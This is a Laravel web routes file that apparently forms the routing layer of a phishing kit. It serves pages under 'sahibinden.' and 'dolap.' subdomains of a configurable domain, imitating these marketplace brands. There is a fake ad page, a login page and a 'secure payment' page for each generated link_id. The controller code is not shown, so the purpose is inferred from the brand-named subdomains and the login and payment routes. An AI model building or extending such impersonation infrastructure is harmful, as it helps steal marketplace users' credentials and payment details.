<?php

use Illuminate\Support\Facades\Route;

use App\Http\Controllers\AdController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::domain("sahibinden.".config("sahibinden.domain"))->group(function() {

	Route::get("/ilan/{ad_title_encoded}/{link_id}/detay", [ AdController::class, "sahibinden"]);
	Route::get("/giris/{link_id}", [ AdController::class, "sahibinden_login_mobile"]);
	Route::get("/param-guvende/odeme-yap/{link_id}", [ AdController::class, "paramguvende"]);

});

Route::domain("dolap.".config("dolap.domain"))->group(function() {

	Route::get("/urun/{ad_title_encoded}/{link_id}", [ AdController::class, "dolap"]);
	Route::get("/giris/{link_id}", [ AdController::class, "dolap_login"]);
	Route::get("/guvenli-odeme/{link_id}", [ AdController::class, "dolap_guvenliodeme"]);

});